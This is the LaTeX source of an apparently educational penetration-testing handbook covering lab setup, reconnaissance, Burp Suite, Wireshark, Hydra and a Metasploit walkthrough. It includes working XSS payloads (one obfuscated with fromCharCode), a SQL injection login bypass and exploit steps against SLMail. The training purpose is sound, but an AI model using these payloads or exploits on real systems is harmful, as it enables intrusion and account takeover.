%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

%%%%%%%%%%%%%%    CRACKTHATNETWORK     %%%%%%%%%%%%%%%

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

% Compilation info:
% cross references compiled only with latexmk
%
%
%
%
%
%

\documentclass{article}[12pt]
\usepackage{graphicx}
\usepackage{amsmath}
\usepackage[utf8]{inputenc}
\usepackage{amsfonts}
\usepackage{hyperref}
\usepackage[a4paper, total={6in, 9in}]{geometry}
%\renewcommand{\baselinestretch}{1.3}
%\graphicspath{{../pictures/}}
%\setlength{\parindent}{0pt}


\newcommand{\e}[1]{\begin{equation}#1\end{equation}}
\newcommand{\p}[4]{\begin{figure}[ht]\begin{center}\includegraphics[#1]{#2}\caption[#3]{#4}\label{#2}\end{center}\end{figure}}
\newcommand{\bd}[1]{\boldsymbol{#1}}
\newcommand{\q}[1]{\texttt{#1}}
\newcommand{\qq}[1]{\newline\newline\q{#1}\newline\newline}
%\setlength{\topmargin}{0in}

%\cite{v}
%\ref{picture}

\title{\huge{PENETRATION TESTING INSTANT}}
\author{Marcin Birski}



\begin{document}
\begin{center}
\maketitle
\newpage
\end{center}

%\newpage
\begin{abstract}

This book describes methods, rules techniques etc in penetration testing.
    This book is for beginners (but not rookies) as well as for experienced software testers who want to look deeper into testing, scripting, penetration testing, bash, python, javascript and many other things related to penetration testing.
\end{abstract}


\tableofcontents
\newpage


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

%%%%%%%%%%%%%%    CONFIGURATIONS     %%%%%%%%%%%%%%%

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\section{Introduction}
This Book was written for educational purposes for QA engineers in order to improve penetration testing skills.
Book is based on my own experience as well as books mentioned in reference section.
There are also applications and vulnerable systems attached to the file, it means that all instructions written below will be working on these systems.
Penetration testing is practically all about finding vulnerabilities and exploit them.
There are many tools presented in this text that allow you to scan the network, ports, protocols proceeding, as well as directly exploit the targets etc.
Remember that penetration testing techniques are not given recipe how to break or exploit software, they are rather abstractive templates that you need to understand, digest and consciously use.




\section{Software, Hardware, Network and Targets configuration}
The following chapter will cover the most important stuff needed to build penetration testing laboratory.
By laboratory I mean building the local network with static addresses enforced with operating systems, applications and proper hardware in order to keep
investigations at one point and make sure we are not influencing innocent victims PC or laptop machines.
During this chapter you will be asked to preinstall few virtual machines as well as configure their network parameters.
You will also install some target software, as well as other perhaps less important but recommended applications.
We will be using KALI Linux distribution for our penetration testing purposes.
Treat KALI as an investigator.
KALI Linux is Debian-based linux distribution which is the successor of BackTrack linux distribution.
KALI has pre-installed  dozens of penetration testing tools including information gathering, fingerprinting,target exploiting and so forth.
\subsection{Hardware}
It is recommended to use 40-50 GB of space for each operating system as well as at least 2 GB RAM for each.
This is because sometimes you will need to
run some test on few platforms simultaneously and each platform consumes its own RAM memory.
Remember that you cannot leave your host machine with no RAM memory.
\subsection{Virtual machines}

First of all we will start from installing all needed systems and applications.
Install mentioned systems within VirtualBox.
Do the following steps:
\begin{enumerate}
\item{Install VirtualBox}
\item{Install on VirtualBox:}
\begin{itemize}
\item{Kali 3.0.X}
\item{Windows XP English SP3}
\item{Windows 7 Professional SP1}
\item{Ubuntu 8.10}
\end{itemize}
\item{Configure all machines networks to Bridged and select your main interface. Set all machines IPs to static. Remember IP for each machine in the network.
On your host machine Desktop create folder to share. On each of machine create "Insert guest device" and configure it for folder you shared. This will allow you to transfer files with high speed from your host
to your VMs. You might have problems with internet configuration on Windows, check if you have installed Intel drivers for network card, if not transfer them via shared folder and install on proper machines. If your Kali network does not work check your interface and check
\texttt{/etc/network/interfaces}. You might also need to change \texttt{[ifupdown] managed} variable and set it to \texttt{true} in \texttt{/etc/NetworkManager/NetworkManager.conf}}

\item{On Kali you need to add apt-get sources to \texttt{/etc/apt/sources.list} file. Add the following:

\begin{itemize}
\item{\texttt{deb http://http.kali.org/kali kali-rolling main contrib non-free}}
\item{\texttt{deb http://old.kali.org/kali sana main non-free contrib}}
\item{\texttt{deb http://old.kali.org/kali moto main non-free contrib}}
\end{itemize}

Afterwards update and upgrade apt-get and after this instal linux kernel headers by running:
\texttt{apt-get install -y dkms linux headers \$(uname -r)},  \newline
if this does not work include in mentioned command kernel version manually.
}
\item{On linux based machines you will probably need to restart networking by running: \texttt{service networking restart; service network-manager restart}}
\item{Install on Windows XP:}
\begin{itemize}
\item{Zervit 0.4}
\item{SLMail 5.5}
\item{3Com TFTP 2.0.1}
\item{XAMPP 1.7.2}
\item{War-FTP}
\item{WinSCP}
\item{Immunity Debugger (ID); copy Mona.py to C:/Program Files/Immunity inc/Immunity Debugger/PyCommands; at the bottom of ID
in command line type: \texttt{!mona config -set working folder c:/logs/\%p}, this will set logs output.}

\end{itemize}
\item{Make XP act like it is a mamber of a Windows Domain; many external targets are members of Windows Domain so we need this configuration
also on our XP system; In order to set it up go to: \texttt{Start> Run> secpolmsc; Local Policies> Security Options> Network Access> Sharing and security model for local accounts:
Classic - local users authenticate as themselves}}

\item{Install on Kali:}


\begin{itemize}
\item{Android SDK; go to >packages and install Android SDK Tools and Platform Tools; afterwards you will install some Android emulator machines.}
\item{Smartphone Pentest Framework; remember to configure for your host machine in text editor \texttt{kaliinstall} installation script.}
\item{Nessus; go to Nessus web page, register new user and get registration keys; Nessus is opened by
\texttt{/etc/init.d/nessusd start} command; open http://kali:8834 , provide password and username and download plugins.}
\item{Hyperion; you will need to compile hyperion C code using g++.}
\item{Veil-Evasion}
\end{itemize}
\item{Configure Ettercap; edit \texttt{/etc/ettercap/etter.conf} by uncommenting "iptables" redir commands. This sets up a firewall.}
\item{Having configured all VMs ping them from host and vice versa.}
\end{enumerate}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

%%%%%%%%%%%%%%GATHERING THE INFORMATIONS %%%%%%%%%%%%%%%

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


\section{Investigations and information gathering}
The most important thing in software testing are is to gather all possible and needed information about targets.
The more information you are able to analyze, the better and the more valuable test you are able to perform.
Obviously you can proceed with exploration testing with no knowledge about target but it only means you will gather this knowledge
during the investigation what is the point of exploration testing.
Remember that during information gathering phase the most important thing is to keep all info sorted in one place.
You can install program called CherryTree for information storage purposes.


% -------------------------- NETWORK SCANNING --------------------------------------
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\subsection{Mapping network tools}
%\texttt{} : \texttt{ }

\subsubsection{\texttt{whois <options> domain name}}
This tools checks domain registration details like owner, technical contact, OS etc.

\subsubsection{\texttt{nmap <options> ip/ip range <options> <>}}
This if powerfull tool allowing to scan ports or other system information on one or more then one IPs.
\newline
\newline

\texttt{<XXX.XXX.XXX.XXX-XXX>} - Example IP range.
\newline

\texttt{-A} - Shows system parameters.
\newline

\texttt{-oA} - Output in three major formats at once (.nmap, .gnmap (grepable), XML) e.g.: \texttt{-oA <filename>}
\newline

\texttt{-p} - Port range e.g: \texttt{-p 0-500}
\newline

\texttt{-sS} - SYN scan, "half-open scan", is part of TCP scan but without ACK (TCP handshake consist of SYN/SYN-ACK/ACK).
SYN checks if ports are available but does not start the connection.: \texttt{-p 0-500}.
\newline

\texttt{-sV} - Version scan, gives more detailed information about target.
\newline

\texttt{-sU} - UDP scan (User Datagram Protocol is a part of core members of Internet Protocol Suite).
Nmap here sends a UDP packet to a port.
If port is not open nmap recives "port unreachable" message.
Usually this scan shows different ports than other scans and it takes more time to proceed.
\newline



\subsubsection{\texttt{NetCat: nc <options> hostname port(s)}}
Netcat, usually abbreviated to nc, is a network utility with which you can use TCP/IP protocols to read and write data across network connections.
You can use it to create any kind of connection as well as to explore and debug networks using tunneling mode, port-scanning, etc.
Checks whether given ports are listening.

\texttt{-v} - Verbose, use twice (-vv) to get more info, e.g: \texttt{nc -v 127.0.0.1  8080}

\subsubsection{\texttt{nslookup}}
DNS translator. Example : \texttt{nslookup www.google.com}

%TODO add more details
\subsubsection{\texttt{host}}
Ask for a servers for particular domain.

\subsubsection{\texttt{theHarvester}}
Phyton tool quickly goes through many searching engines for possible email addresses.
\newline

\texttt{-d} - Domain name
\newline

\texttt{-l} - Limit outcomes
\newline

\texttt{-b} - Specify search engines e.g.: \texttt{ theharvester -d cogniance.com -l 100 -b all }


%TODO add more details
\subsection{\texttt{Maltego}}
\label{subsec:maltego}
This data-mining tool visualises open source intelligence gathering.
In order to run maltego type in command line \texttt{maltego}.
You will be asked to register new account for free usage (maltego has also paid version which is more powerfull).



\subsubsection*{\texttt{}}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\subsection{Hunting for vulnerabilities, NESSUS}

Nessus has already been installed on Kali VM. In order to run Nessus you must run daemon by typing: \texttt{service nessusd start} in the terminal.
Nessus by default is running on \texttt{https://kali:8834 port}.
If you want to enter Nessus from outside of Kali you must type \texttt{https://<kali\_ip\_address>:8834}.

\subsubsection{Policies}

Policies are the set of rules explaining what to do during scan or how to behave when vulnerability has been found.
In order to create new policy go to Policies/New Policy.

\subsubsection{Scan}

In order to prepare new scan go to My Scans/New Scan.
Set up all needed information and set target(s) IP(s).
After scanning all data about vulnerabilities can be found in my Scans section.


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\subsection{Web application scanning. Web crawlers}
\label{subsec:webscanning}

In general web application scanners work from two points of view.
First is when we know all the endpoints of the web application and we put that endpoints as input for scanner.
Then scanner "somehow" is looking for application vulnerabilities like hidden fields, comments hardcoded values etc.
Second method is when we do not know endpoints of the application so we need to discover them.
The process of endpoints discovery is called "crawling".
Web crawlers are forced with word lists and use them as assumption of endpoint names by sending thousands of (usually HTTP GET) requests on prepared endpoints.
For example if word list consist of one word "hackme" and host name is 10.10.10.10 crawler will be looking for \texttt{10.10.10.10/hackme} endpoint.
The same if word list consist of many words (millions or billions) discovered endpoint list grows as tree and iv time consuming.
The positive value is that crawlers give you a lot of information about website structure and give you many ideas which endpoints could be vulnerable.
\subsubsection{nikto}
Nikto is web application vulnerability scanner.
Nikto output verboses information and potential vulnerabilities in terminal.
This information are readable suggestions.
\newline
\texttt{nikto -h google.pl}

\subsubsection{dirb}

Dirb scanner uses predefined wordlist in order to check all child directories for provided parent one node eg:
\newline
\texttt*{dirb 'http://10.10.10.76/admin/api'}

\subsubsection{crawler (wmap)}
It is actually powerful metasploit module and it is called: \texttt{auxilary/crawler/msfcrawler} and its being used in the same way as other metasploit modules.

\subsubsection{websploit}

This is a substitute for metasploit for web applications and its usage is very similar.
One websploit module works similarly to wmap and it is called: \texttt{web/dir search}.
Usage is as regular websploit module.


\subsubsection{spider}
Spider is a module of burp suite that scans the application.
See more in \ref{subsec:burp}

\subsubsection{gobuster}
Gobuster is a tool used to brute-force on URLs (directories and files) in websites and DNS subdomains.
Gobuster can be downloaded through the apt- repository.
Example syntax is: \newline
\q{gobuster -u http://192.168.1.108/pages -w /usr/share/wordlists/dirb/common.txt}








%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%
%%%%%%%%%%%%%%%    CAPTURING TRAFFIC     %%%%%%%%%%
%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\section{Capturing traffic}
\label{sec:traffic}

%TODO add more details
\subsection{BurbSuite}
\label{subsec:burp}

Burb suite allows you to intercept (capture) information from/to websites through a proxy.
It basically captures only HTTP/S requests going through your client.
When configuring Burb suite make sure that Burb suite works on localhost and port 8080 (obviously you can choose another one but must be the same as for browser).
Set manually your browser proxy on local host to 8080.
In case when another application is listening on port 8080 change it to different port.
It means: always you want to send a request from the client to website it passes through the proxy on port 8080 and is passed to the Burb suite.
Burb suite can manipulate requests and forward them after changes.
It allows you ot manipulate requests and their parameters.
When you set up proxy settings turn Burb suite and your browser.
From now all requests you send through browser are catched in burb and you can change their parameters and forward them farther.

\subsubsection{Target module}
Target module consist of Site map and Scope.
Site map lists all the pages and sublists all the subpages that you visited (or your client has redirected to in some way).
You can add them here to Scope which is the area of your interests.
Choose the target pages and add them to scope (right click/add to scope).
From now you will not be working outside the target pages so your penetration test will be safe (you will not break out-of-scope pages).

\subsubsection{Proxy module}
Most important parts of Proxy module are Interception and HTTP history.
If you are on interception tab and interception it turned on, all HTTP requests are stopped here.
You can modify each request body or header.
Changing bodies of HTTP requests is very powerful because you can check for instance if server validates input data in the same way as front end parts do.
You can forward the intercepted request to server (or another proxy) or drop it.
After forwarding the request you will get the response that you can easily analise.
In options you can choose how interception is being done, you can set up any needed rules for intercepting responses and requests.

\subsubsection{Spider module}
This module works as crawler, but not entirely - it does not use any word list in order to investigate the web page.
It simply clicks on everything on web page.
It might be dangerous because by clicking on everything you can remove something or delete user etc, basically do some unessesary stuff.
In order to use spider go to target site map, right click on website you want to crawl through and (... you should know what to do next).
Afterwards all the spidered pages will be shown in target module.


\subsubsection{Scanner module}

Scanner module is vulnerability scanner and is present only in professional (non-free) version.

\subsubsection{Intruder module}

%todo add reference to hydra
In some cases you might want to use repeater for request multiplication.
Considering you have input field in the application and the does not count number of requests made on it.
In other words if you can call the endpoint multiple times without blocking the IP address you can use intruder mode.
There are also other tools helping to conduct such scenario, for more info see brute force attacks in \ref{subsec:bruteforce}.\newline \newline
In order to use intruder you must (like always) right click on the request from request list and send it to intruder.
You can (like in repeater) add each request into new fresh tab which makes your work clean.
Usually intruder module will preselect body variables to help you, but you can choose your own positions.
There are four tabs in intruder mode: target, positions,payload and options.
In target tab you configure the target host and ports.
In positions tab there are preselected positions of request variables within the body.
If you do not accept preselection you can use buttons and add, clear, or set auto selection.
Also there are four attack types to select from the list: Sniper, Battering ram, Pitchfork, Cluster bomb.

\paragraph{Sniper}
This uses a single set of payloads.
It targets each payload position in turn, and places each payload into that position in turn.
Positions that are not targeted for a given request are not affected - the position markers are removed and any enclosed text that appears between them in the template remains unchanged.
This attack type is useful for fuzzing a number of request parameters individually for common vulnerabilities.
The total number of requests generated in the attack is the product of the number of positions and the number of payloads in the payload set.
In other words if we have 5 inputs and 10 payload elements intruder will run 50 times.
\paragraph{Battering ram}
This uses a single set of payloads.
It iterates through the payloads, and places the same payload into all of the defined payload positions at once.
This attack type is useful where an attack requires the same input to be inserted in multiple places within the request (e.g. a username within a Cookie and a body parameter).
The total number of requests generated in the attack is the number of payloads in the payload set.
In other words if we have 5 inputs and 10 payload elements intruder will run 10 times.
\paragraph{Pitchfork}
This uses multiple payload sets.
There is a different payload set for each defined position (up to a maximum of 20).
The attack iterates through all payload sets simultaneously, and places one payload into each defined position.
In other words, the first request will place the first payload from payload set 1 into position 1 and the first payload from payload set 2 into position 2;
the second request will place the second payload from payload set 1 into position 1 and the second payload from payload set 2 into position 2, etc.
This attack type is useful where an attack requires different but related input to be inserted in multiple places within the request (e.g. a username in one parameter, and a known ID number corresponding to that username in another parameter).
The total number of requests generated in the attack is the number of payloads in the smallest payload set
In oder words if you have 5 inputs you choose and 5  payload elements intruder will run one time, if you have 5 inputs and 10 payload elements it will run 2 times etc.
\paragraph{Cluster bomb}
This uses multiple payload sets.
There is a different payload set for each defined position (up to a maximum of 20).
The attack iterates through each payload set in turn, so that all permutations of payload combinations are tested.
If there are two payload positions, the attack will place the first payload from payload set 2 into position 2, and iterate through all the payloads in payload set 1 in position 1;
it will then place the second payload from payload set 2 into position 2, and iterate through all the payloads in payload set 1 in position 1.
In other words this module will run all possible permutations of payloads and inputs.
This attack type is useful where an attack requires different and unrelated or unknown input to be inserted in multiple places within the request (e.g. when guessing credentials, a username in one parameter, and a password in another parameter).
The total number of requests generated in the attack is the product of the number of payloads in all defined payload sets - this may be extremely large.
\newline
Once you have chosen the attack type you will see different payload options in payload tab.
You can also configure them here.
You can provide your own word list by copying it and pasting in PayloadOptions after choosing PayloadType to Simple list.
Afterwards just go to "Intruder" tab in the main menu bar and start attack.
After your attack is finished you can compare chosen responses in comparer (see \ref{subsubsec:comparer}).

\subsubsection{Comparer}
\label{subsubsec:comparer}
It compares selected requests or responses.
Basically click on few (at least two) requests and send it (or their responses) to comparer.
Inside comparer you can compare then from byte or word point of view.

\subsubsection{Repeater module}

Repeater allows you basically to resend intercepted requests as many times as you want.
In order to send request to repeater right click on request (it does not matter wher it is) and send it to repeater.
Now in the repeater tabno can read responses modify them before reach the client, modify requests before reach server etc.
Simple is that.


\subsubsection{Sequencer module}
Sequencer is more sophisticated but still easy to use module that checks the entrophy or randomness of given tokens, cookies or other weird parameters.
Like always send chosen request to the sequencer.
Usually if your request consist of one token, cookie or something you want to check it will appear automatically in the Token Location Within Response section.
You can also customize it by using regexps in Configure tab.
Once you clicked on Configure button you can type boundary expressions in input fields or just select them within request headers and it will be automatically added to regexp section.
If you are sure that you have chosen proper points to measure the entropy click on Start Live Capture.
Simple is that.
Usually it takes 20 000 requests to measure the randomness but you can stop it and analyse also smaller amount of data.
During the measurement you can copy tokens to the text file so it will help you to analyse then in case entrophy is very low.

%todo add analyse + graph pictures
\subsubsection{Other modules}


\paragraph{Hint} \texttt{ctrl+U} encodes the text.

\subsection{Wireshark}
\label{subsec:wireshark}

Wireshark is the tool that connects to particular interface(s) in order to capture traffic.
It allows you to capture traffic on your local ethernet or interface as well as on router.
Wireshark is very powerful tool in networking area and some of its features are described below.

\subsubsection{Capturing traffic on Ethernet interface}

After running Wireshark you will be prompted to choose an interface to work with.
If you see no interfaces you must run Wireshark in administrator mode.
Once you have chosen Ethernet interface you will be moved to to traffic window.
Click on "start capturing" in order to record traffic on Ethernet interface.
Currently you capture all the packages going through chosen interface.
And here all means ALL.
You are basically capturing everything that goes through your network interface.
You are capturing packages and protocols from all OSI layers (Check \ref{subsec:osi} for more detailed description of layers) of data transmission: \newline \newline
Layer 7 - Application \newline
Layer 6 - Presentation \newline
Layer 5 - Session \newline
Layer 4 - Transport \newline
Layer 3 - Network \newline
Layer 2 - Data Link \newline
Layer 1 - Physical \newline


You will be overloaded by amount of data in capturing window.
In order to sort it in some usefull way special filters can be used.
You can type basically \texttt{http} or \texttt{ssl} in filter pane and confirm it (you might need to restart capturing).
Afterwards you will see only http or tls protocols data in capturing window.
You can obviously set up other filters if needed, they can be related to variety of protocols.
You can click on one line and in window below you will see data from the given protocol as well as from protocols included in the request.
In order to customize filters click on "Expression..." which is located by the filter pane.


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

%%%%%%%%%%%%%%    ATTACKS     %%%%%%%%%%%%%%%

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\section{Attacks}

In this section few types of attacks and related to them tools are described.

\subsection{Brute force attack}
\label{subsec:bruteforce}
This attack relates to forcing the target.
In this scenario you want to send thousands of requests on one endpoint or set of endpoints.
In such case you think that after such stack of tries you will find the solution.
There are many ways and tools to help you in this attack and they are mentioned below.

\subsubsection{Hydra}
\label{subsubsec:hydra}
Hydra is a parallelized login cracker which supports numerous protocols to attack.
It is very fast and flexible, and new modules are easy to add.
This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely.

The basic syntax is: \texttt{hydra -L <path\_to\_login\_wordlist> -P <path\_to\_pass\_wordlist> <target\_ip> }

You can also use it for endpoints that does not need pass and login, it can be used for any kind of input.

\subsubsection{Curl}
Curl is mentioned here but it is not attack-focused tool.
It is mentioned here since it allows you send multiple requests in looped way by scripting in bash.
In order to sent POST request on \texttt{/registration} endpoint you should send the following request multiple times:\newline \newline
\texttt{curl -d "param1=value1\&param2=value2" -X POST http://<remote\_or\_local\_host>:3000/data} \newline
where param1 and param 2 can be login and password.
For more detailed info about scripting in curl see\ref{subsubsec:curl}.
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

%%%%%%%%%%%%%%    METASPLOIT     %%%%%%%%%%%%%%%

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\section{Metasploit}
Metasploit is a framework for penetration testing, which has included the whole base of vulnerabilities for different systems and API that allows testers to exploit or scan targets.
By vulnerabilities here are meant points of the target which are not secured properly and are vulnerable for attack e.g:
login or password buffer overflow on target's database server.
Metasploit uses predefined exploits and payloads in order to get control over the target system.
Exploit is technically program (procedure) that uses shellcode scripts in order to exploit vulnerabilities Each exploit and payload must be configured for particular target.




%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\subsection{msfconsole}
In order to use metasploit framework you can go directly to Applications->Exploitation tools and go to Metasploit.
This approach will run the terminal simultaneously running all
data bases and services in the background.
If you wish you can run Metasploit directly from terminal by typing \texttt{msfconsole} but you might need to run postgresql service (\texttt{service postgresql start}).

\subsubsection{Searching for exploits, run exploit}

Now you need to see the info, options and payloads for the exploit by typing: \texttt{info, options, show payloads} respectively.
If you know what exploit you will be using you can directly type into msf console the following line:
\texttt{use <exploit/name>}.
If you do not know the exploit you can check it online on www.rapid7.com
or by typing in msf console \texttt{search <exploit/tag/orname>} and then you can \texttt{use} it.
Afterwards you are moved to exploit subconsole.
Now you need to set the payload: \texttt{set payload <payload/name>},
then if you type \texttt{options} again, you will see all mandatory options (for listener and reciever).
Now is time for setting up the options e.g: \texttt{set RHOST 192.168.4.56} or \texttt{set LHOST 192.168.4.56}
if you are using reverse shell (pushing the connection back to the listener (attack machine) rather than
waiting for an incoming connection from target which is more likely to make connection through firewall \cite{pen}).

\subsubsection{Outputing data}
If you want to output data somewhere (which is VERY usefull) you can use spooling before you start exploiting.
Just type in msf console (before running exploit) \texttt{spool <file-name.txt/log/etc>}.
In order to turn off spooling use \texttt{spool off}.
Spool saves the whole terminal output stream.
\paragraph{Example}
In this example you will get control over the Windows XP SP3 system which you installed as VM. In msfconsole run the following: \newline\newline
\texttt{use/windows/pop3/seattlelab\_pass} \newline
\texttt{set RHOST XXX.XXX.XXX.XXX} (your target IP) \newline and run the exploit by typing: \newline \texttt{exploit} \newline \newline

Now you are in meterpreter sub console.
Check the following commands: \texttt{help, background, pwd, shell}, for more commands go to: https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/ .
So what has happend ?
You exploited unauthenticated buffer overflow vulnerability in the POP3 server of Seattle Lab Mail 5.5 by sending a password with excessive length (for more info check exploit info in msfconsole, for more info about buffer overflow go to Buffer Overflow section in this article).

\subsubsection{msfcli}
MetaSploit Framework Command Line Interpreter is another way to interact with Metasploit.
Is especially useful while scripting Metasploit commands or while testing new payloads in automated way.


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\subsection{Metasploit Scanner Modules and Check functions}

Metasploit serves vulnerability searching modules, these modules begin from \texttt{scanner/}.
In order to use metasploit scanner treat scanner as regular module and run is with \texttt{use <module\_name>}, set up options and run exploit.
Example module can be \texttt{scanner/ftp/anonymous} which searches for anonymous access via FTP ports, which can be dangerous when some important data
are stored on client side and are allowed to use FTP port.

Some exploits have embeeded \texttt{check} functions.
They can be used instead of \texttt{exploit} function in order to literally check if target is vulnerable to given exploit.


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\subsection{Armitage}

Armitage is GUI for metasploit enriched by many automated tools helping a tester figure out what exploit should be used (what is the target vulnerability).
In order to run Armitage go to Applications-> Exploitation Tools.
Login to database with default credentials.
Armitage is good option if you have no ideal what exploit you should use.
There two options to get that knowledge.
First is to check all possible attacks and choose preferred one, second is run Heil Mary and perform all possible attacks one after another.
The difference is that first method
only checks for available exploits for the target whereas the second one runs all exploits without asking.
The problem is that the second one can really crash the system, so it is not recommended but still worth to work around.
First of all go to: Hosts->Nmap->Intense\_scan or Hosts->MSFscan
, you will then get your local network scanned so you will know what systems are there and what exploit you will be able to use.
In order to perform first option go to: Hosts->Find\_attacks.
After this you will need click on selected machine and choose check all possible attacks separately, then choose proper exploit and use it.
If you want to use second option go to Hosts>Heil Mary, after this all possible exploits will be ran on the target system.
If your system is vulnerable and can be affected, the system "screen" icon will changed and you will be informed about action taken over the system.
Then you can run meterpreter from target options and use the same commands like in terminal meterpreter.

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

%------------------------------- MUTILLIDAE-------------------------------------------

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%


\section{Mutillidae} Mutillidae is webpage build by OWASP team.
The webpage consist of many vulnerabilities and can be used for practising techniques.
In order to run Mutillidae download it from OWASP page.
Mutillidae folder consist of many PHP files, txt files and many others.
Copy the folder to your localhost htdocs folder (in my case /opt/lampp/htdocs).
Here I assumed you have already installed and configured XAMPP the newest version.
Dont mistake this XAMPP distro with the vulnerable one we installed for testing purposes.
Finally restart (or start) XAMPP by typing \texttt{./xampp start} (or restart).
Now you can use all Mutillidae features.


%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

%------------------------------- TOP WEB VULNERABILITIES-------------------------------

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%



\section{Top Web and Application vulnerabilities}



%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\subsection{XSS} XSS is known as Cross Site Scripting.
XSS is all about embeeding unneded code within website.
If application stores any kind of user input and shows this input to the user or allows you to store any kind of data within html, there is always risk that XSS can be done over the website.

\subsubsection{Reflected} Injected code is used only once (it can be used many times indeed but is always used in time of sending it, copying, pasting, reloading the page etc).
For example if your application uses somehow show the data passed through CGI to the end user (e.g. embeeds CGI parameters inside html) attack can be performed by passing invalid URL: \texttt{http://application.com/search.php?title=<script>action()</script>}.
Another technique is to pass mailicious code after \# hash in URL: \texttt{}.
\subsubsection{Stored}  Code is stored and is ran every time page is being ran.
In such case there are thousands of scenarios.
If you find an input that does not validate JavaScript as plain text but as code you won.
Below are mentioned some input data (payloads) you may inject as JavaScript code.\newline

\q{Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>} \newline
Payloads containing spaces can also be sent however the src cannot contain any spaces or quotations so it needs to be converted into char codes, combined into a string and evaluated: \newline
\q{<iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,116,101,115,116,32,61,32,49,50,51,59,10,97,108,101,114,116,40,116,101,115,116,41,59])) width=0 height=0 style=display:none;></iframe>} \newline
\paragraph{Hint} \q{\&lt;} and \q{\&gt;} are used for \q{<} and \q{>} respectively in encoding convention.


\subsubsection{DOM-based} Could be considered as refelected XSS. Injected script is located on client side (for instance: data stored after \# in URL (www.site.com/index.php\#<script></script>) is not transmitted to the server - it stays locally on client side or in DOM)-DOM-based XSS does not reach the server.
DOM-baset XSS payload can be injected inside html events like follows: \texttt{<input type="button" name="button" onmouseover="javascript:document.action()">}.
In example above custom function action() is executed when moving mouse coursor over the button.
There are many attributes like: \texttt{onload, onclick} etc.
In another case javascript script path can be embeeded as path to image like follows:
\texttt{<IMG source="javascript:<path\_to\_the\_script>"}.
In this example source can be either javascript script itself or just path to script located somewhere in the internet or locally.
It means that source could become:
\texttt{...source="http://magicsctipts.end/magicalscript.js"}
Or or instance: \q{<img src=javascript:alert(1)>}.
But remember that usually you inject the code so it should like: \q{"><img src=javascript:alert(1)>}.



%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\subsubsection{BeEF} Beef is a tool for conducting XSS attacks.




%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

\subsection{Injections}
\subsubsection{SQL injection}
Let's imagine there is an user input in the application or on the web page that allows end user to interact with database.
SQL injection appears when
user input data is not properly validated and sanitized and input provided by user can be threated by database engine as a part of SQL syntax.
If mentioned input is login and password the simple example SQL syntax could look like:
\newline
\texttt{SELECT * FROM users WHERE login='<user input login>' and password='<user input password>'}
\newline
If input is not properly secured simple SQL injection could take place while providing the phrase between quotes "":\texttt{"' OR 1=1 -- "}.
Whis phrase within the entire query qill look like:
\newline
\texttt{SELECT * FROM users WHERE login='' OR 1=1 -- ' and password='<user input password>'}
So it does not matter what password we provided since is was commented out by "-- " which comments out queries in SQL syntax.
Remember that after "-- " one space is present.
In mentioned query "1=1" statement always recives TRUE so the whole query is executed.
Obciously before commenting out the password input we could finish this query and start another one with different function (in this query we deal with SELECT FROM function).

